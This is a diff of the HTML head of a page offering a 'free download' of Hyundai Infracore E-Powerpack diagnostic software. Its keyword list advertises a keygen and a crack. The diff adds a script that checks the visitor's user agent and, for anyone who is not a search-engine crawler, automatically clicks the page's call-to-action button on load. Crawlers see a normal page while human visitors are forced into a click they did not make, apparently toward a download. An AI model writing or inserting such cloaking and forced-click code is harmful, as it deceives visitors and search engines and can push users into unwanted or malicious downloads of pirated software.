@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyundai Infracore E-Powerpack v01.00 r1 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Hyundai Infracore E-Powerpack v01.00 r1 05.2024 diagnostic software for machinery. Available in English and Korean. Free download.">
     <meta name="keywords" content="Hyundai Infracore E-Powerpack, Hyundai Infracore E-Powerpack v01.00 r1 05.2024, Hyundai E-Powerpack 2024, Hyundai E-Powerpack download, Hyundai E-Powerpack free download, Hyundai E-Powerpack diagnostic software, Hyundai E-Powerpack diagnostic software download, Hyundai E-Powerpack diagnostic software free download, Hyundai E-Powerpack keygen, Hyundai E-Powerpack crack, Hyundai diagnostic software, Hyundai diagnostic software download, Hyundai diagnostic software keygen, Hyundai diagnostic software crack, Hyundai machinery diagnostics, Hyundai heavy equipment software, electronic powerpack tool, machinery diagnostics, heavy equipment diagnostics, fault code reader, performance monitoring, system tests, electronic control systems, Hyundai Infracore diagnostics, real-time data monitoring, machinery troubleshooting, software version 05.2024, electronic powerpack diagnostics, heavy machinery maintenance, construction machinery troubleshooting, hyundai infracore e-powerpack, heavy machinery fault codes, construction equipment monitoring, hyundai infracore machinery, electronic control systems, heavy equipment performance, construction vehicle diagnostics, hyundai real-time data monitoring, machinery fault detection, construction equipment maintenance, hyundai system testing, heavy machinery repair, construction vehicle troubleshooting, hyundai infracore software, electronic diagnostics tool, heavy equipment efficiency, construction machinery reliability, hyundai equipment diagnostics, electronic powerpack monitoring, heavy vehicle fault analysis, construction equipment software, hyundai machinery maintenance, electronic control unit diagnostics, heavy machinery performance optimization, construction vehicle repair, hyundai infracore technician tool, electronic systems troubleshooting, heavy equipment software, construction machinery diagnostics interface, hyundai uvim communication, electronic powerpack analysis, heavy vehicle maintenance software, construction equipment fault codes, hyundai machinery performance, electronic diagnostics interface, heavy machinery testing, construction vehicle monitoring, hyundai infracore repair tool, Hyundai E-Powerpack pdf, Hyundai E-Powerpack pdf free download, Hyundai E-Powerpack tutorial pdf, Hyundai E-Powerpack training pdf free">
     <style>
